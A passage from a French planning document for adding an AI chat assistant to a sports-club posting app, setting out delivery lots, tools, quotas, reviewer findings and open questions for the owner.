- Extraire un service `createCustomPostDraft` de `app/api/posts/custom-post/route.ts` (la logique y est, pas dans un service), avec un test de non-régression avant extraction. Schéma Zod de l'outil aligné sur les limites de la route (200 caractères par champ, 10 informations clés).
- Migrations `AssistantConversation`, `AssistantMessage`, `UsageEvent` (additives). Pas de `ClubMemoryItem` en lot 1.
- Route `POST /api/assistant/messages`, boucle bornée, exécuteur Zod strict.
- Outils : `get_week_schedule` (lecture de `WeeklySchedule` / `TenupSchedule` filtrée par `clubId`, sans `Fixture`), `create_post_draft`, `revise_post_draft`.
- Les consignes de ton passent par `customInstructions` existant (mémoire reportée au lot 2).
- Quotas : offre inchangée ; journal par appel (`assistant_turn`) et limite de messages par heure sur le modèle de `checkIntentExtractionRateLimit`. Les plafonds par plan du §9.3 arrivent au lot 2.
- UI : carte texte + `PublishPanel` **sans visuel** (`getImageBlob` renvoie `null`, comme `TextPostsPanel`), mobile d'abord, derrière un drapeau. `PostsResult` exige un `MatchData` avec score et n'est pas réutilisable pour une annonce.
- **Hors lot 1** : mémoire et son écran, `propose_memory_update`, `get_connections_status`, `list_recent_posts`, visuels dans le chat, `Fixture`, pièces jointes, briefing, outils irréversibles.
- Bloquant : tests d'isolation (T1), injection (T4), publication par clic seul (T5), limite de débit (T7) verts ; passage `security-reviewer` et `final-reviewer`. Une base de test est nécessaire : à chiffrer et justifier dans la tâche.
- Réalisme : lot 0 + lot 1 dépassent trois semaines à temps partiel si tout est fait ; si le temps manque, couper dans l'ordre : revision, UI polie, streaming.

### Lot 2 : calendrier et multisport, ~6 j
`Team`, `Fixture` (double écriture, backfill), outils `search_calendar` et `propose_calendar_event`, vocabulaires manquants. Benchmark de modèles avant ce lot.

### Lot 3 : proactivité, ~4 j
`ProactiveNotice`, briefing remplaçant le digest, suggestions à l'ouverture du chat.

### Lot 4 : actions confirmées par le serveur, ~6 j
`AssistantAction`, `request_publish`, `request_delete`, route `/confirm`, tests T5 complets, `security-reviewer`.

### Lot 5 : chat par défaut, pièces jointes, tennis comme connecteur, ~8 j
Vue assistant par défaut, onboarding conversationnel, `read_attachment`, `import_tenup_schedule`, retrait de `intent/extract`.

Ordre : 0 → 1 → (validation TCB) → 2 → 3 → 4 → 5.

## 12. Dépendances

**Aucune nouvelle dépendance.** `openai@6` (outils, streaming, vision), `zod@3` (arguments d'outils). Pas de framework d'agent, pas de base vectorielle (quelques dizaines d'entrées par club), pas de bibliothèque de chat. Tests de base de données (lot 0) : solution à justifier au moment de la tâche.

## 13. Ce que les relectures ont changé

- **Architect** : corrections du premier plan (Next 14 obsolète, `clubProfile` sans lieux, digest sans dédoublonnage, cron tennis en `FULL_AUTO`) ; modèle multisport additif, mémoire non migrée, vue `assistant` dans la navigation.
- **Contradicteur** : le lot 1 initial ne servait pas le TCB (le chat ignorait ses données Ten'Up) ⇒ ajout de `get_week_schedule`. `create_post_draft` n'est pas une simple réutilisation (logique dans la route `custom-post`) ⇒ extraction d'un service. Cartes UI non réutilisables telles quelles ⇒ texte seul en lot 1. Mémoire, `list_recent_posts`, `get_connections_status` et plafonds par plan reportés au lot 2. Durée réévaluée : plus de 3 semaines à temps partiel pour les lots 0 + 1. Doubles comptages de quota évités.
- **Sécurité** : le « clic humain » n'est pas imposé par le serveur ⇒ correctifs C2 à C5 au lot 0, T15 à T18 ajoutés ; `tenup-scrape` publie des données scrapées sans humain (C1) ; double publication possible via `publish-retry` (C4) ; validation d'image absente (C3) ; réservation atomique du quota remontée au lot 0.
- Le détail de ces correctifs reste à vérifier dans le code lors de chaque tâche : les relecteurs lisent, ils n'exécutent pas.

## 14. Questions ouvertes pour vous

1. **Durée** : lots 0 + 1 ≈ 13 à 16 j. Acceptable, ou voulez-vous couper (revision, streaming, UI polie) ?
2. **Lot 1 sans actions irréversibles** : acceptez-vous que le chat n'appuie jamais lui-même sur « Publier » au début ?
3. **Tennis** : garder le module Ten'Up/FFT (~4 300 lignes, ScrapingBee payant) en connecteur, le geler ou le supprimer ?
4. **Plafonds et offre** : valider les plafonds du §9.3 et la formulation de « illimité ».
5. **Plan Gratuit** : 3 publications par mois via le chat ? Lecture de captures autorisée (0 proposé) ?
6. **Multi-admin / multi-section (Pro)** : l'offre les promet, le code ne semble pas les servir. Avant ou après le chat ?
7. **Moteur de visuels** : le chat reste-t-il sur le moteur actuel, ou attend-on le Design Engine de `design-engine/prototype` ?
8. **Prérequis techniques** : plan Vercel (durée de fonction, cadence des crons), options de conservation du compte OpenAI, région Supabase.
9. **Brouillons du chat** : supprimés après 30 jours comme les autres ou conservés ?
10. **RGPD** : souhaitez-vous un avis juridique avant de stocker des noms de joueurs ?
11. **`CLAUDE.md`** : doit-il être créé ? Les règles citées n'ont pas pu être relues à la source.
